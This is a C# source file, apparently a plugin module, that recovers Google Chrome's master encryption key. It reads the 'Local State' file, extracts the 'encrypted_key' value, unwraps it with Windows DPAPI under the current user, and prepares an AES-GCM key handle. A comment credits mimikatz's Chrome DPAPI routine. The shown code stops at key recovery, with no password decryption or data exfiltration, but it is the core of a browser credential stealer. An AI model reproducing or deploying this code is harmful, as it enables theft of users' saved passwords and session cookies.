using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Plugin
{
    internal class ChromiumUtils
    {
        private static readonly byte[] DPAPI_HEADER = Encoding.UTF8.GetBytes("DPAPI");

        public static byte[] DecryptBase64StateKey(string base64Key)
        {
            var encryptedKeyBytes = Convert.FromBase64String(base64Key);
            if (ByteArrayEquals(DPAPI_HEADER, 0, encryptedKeyBytes, 0, 5))
            {
                Console.WriteLine("> Key appears to be encrypted using DPAPI");
                var encryptedKey = new byte[encryptedKeyBytes.Length - 5];
                Array.Copy(encryptedKeyBytes, 5, encryptedKey, 0, encryptedKeyBytes.Length - 5);
                var decryptedKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
                return decryptedKey;
            }

            Console.WriteLine("Unknown encoding.");
            return null;
        }

        private static bool ByteArrayEquals(byte[] sourceArray, int sourceIndex, byte[] destArray, int destIndex,
            int len)
        {
            var j = destIndex;
            for (var i = sourceIndex; i < sourceIndex + len; i++)
            {
                if (sourceArray[i] != destArray[j])
                    return false;
                j++;
            }

            return true;
        }

        public static string GetBase64EncryptedKey()
        {
            var localStatePath = Environment.GetEnvironmentVariable("LOCALAPPDATA");
            // something weird happened
            if (localStatePath == "")
                return "";
            localStatePath = Path.Combine(localStatePath, "Google\\Chrome\\User Data\\Local State");
            if (!File.Exists(localStatePath))
                return "";
            var localStateData = File.ReadAllText(localStatePath);
            var searchTerm = "encrypted_key";
            var startIndex = localStateData.IndexOf(searchTerm);
            if (startIndex < 0)
                return "";
            // encrypted_key":"BASE64"
            var keyIndex = startIndex + searchTerm.Length + 3;
            var tempVals = localStateData.Substring(keyIndex);
            var stopIndex = tempVals.IndexOf('"');
            if (stopIndex < 0)
                return "";
            var base64Key = tempVals.Substring(0, stopIndex);
            return base64Key;
        }

        private static bool NT_SUCCESS(uint status)
        {
            return 0 == status;
        }

        //kuhl_m_dpapi_chrome_alg_key_from_raw
        public static bool DPAPIChromeAlgKeyFromRaw(byte[] key, out BCrypt.SafeAlgorithmHandle hAlg,
            out BCrypt.SafeKeyHandle hKey)
        {
            var bRet = false;
            hAlg = null;
            hKey = null;
            uint ntStatus;
            ntStatus = BCrypt.BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0);
            if (NT_SUCCESS(ntStatus))
            {
                ntStatus = BCrypt.BCryptSetProperty(hAlg, "ChainingMode", "ChainingModeGCM", 0);
                if (NT_SUCCESS(ntStatus))
                {
                    ntStatus = BCrypt.BCryptGenerateSymmetricKey(hAlg, out hKey, null, 0, key, key.Length);
                    if (NT_SUCCESS(ntStatus))
                        bRet = true;
                }
            }

            return bRet;
        }
    }
}